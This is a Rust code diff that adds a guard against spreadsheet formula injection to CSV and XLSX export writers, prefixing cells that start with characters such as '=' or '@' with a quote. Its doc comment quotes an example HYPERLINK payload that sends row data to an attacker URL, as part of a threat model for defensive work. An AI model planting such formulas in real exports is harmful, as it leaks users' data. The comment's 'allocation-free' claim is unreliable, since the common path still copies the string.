@@ -201,5 +201,49 @@ impl NdjsonBody {
 }
 
 // ---------------------------------------------------------------------------
+// Spreadsheet safety — shared by the CSV and XLSX writers
+// ---------------------------------------------------------------------------
+
+/// Single-byte sentinels that trigger formula evaluation in Excel /
+/// `LibreOffice` / Numbers when they appear as the first character of a
+/// cell.  Tab and CR are included because Excel will treat them as
+/// whitespace-prefixed formula starters when followed by `=` etc., and
+/// because both are present in OWASP's reference list for this attack.
+#[cfg(any(feature = "export-csv", feature = "export-xlsx"))]
+const FORMULA_INJECTION_SENTINELS: [char; 6] = ['=', '+', '-', '@', '\t', '\r'];
+
+/// Prefixes `value` with a single quote when its first character would
+/// otherwise be interpreted by a spreadsheet application as the start of
+/// a formula.
+///
+/// **Threat model.** Any string-shaped cell that starts with one of `=`, `+`,
+/// `-`, `@`, `\t`, `\r` is parsed as a formula or macro when the export is
+/// opened, so a cell containing
+/// `=HYPERLINK("http://attacker/?leak="&A1,"click")` exfiltrates row data to an
+/// attacker-controlled URL. The single-quote prefix is the standard OWASP
+/// mitigation; downstream tooling that wants the raw value sees the leading `'`
+/// and must strip it.
+///
+/// Returns `value` unchanged for non-dangerous prefixes (the common case) so the
+/// function is allocation-free on the hot path.
+///
+/// Lives here, above both writers, rather than in `streaming::csv` (#920): the
+/// concern is shared, and `export-csv` / `export-xlsx` are independently
+/// selectable, so an XLSX-only build could not see a guard that lived in the
+/// CSV module.
+#[cfg(any(feature = "export-csv", feature = "export-xlsx"))]
+pub(crate) fn guard_formula_injection(value: &str) -> String {
+    match value.chars().next() {
+        Some(c) if FORMULA_INJECTION_SENTINELS.contains(&c) => {
+            let mut out = String::with_capacity(value.len() + 1);
+            out.push('\'');
+            out.push_str(value);
+            out
+        },
+        _ => value.to_owned(),
+    }
+}
+
+// ---------------------------------------------------------------------------
 // Tests
 // ---------------------------------------------------------------------------
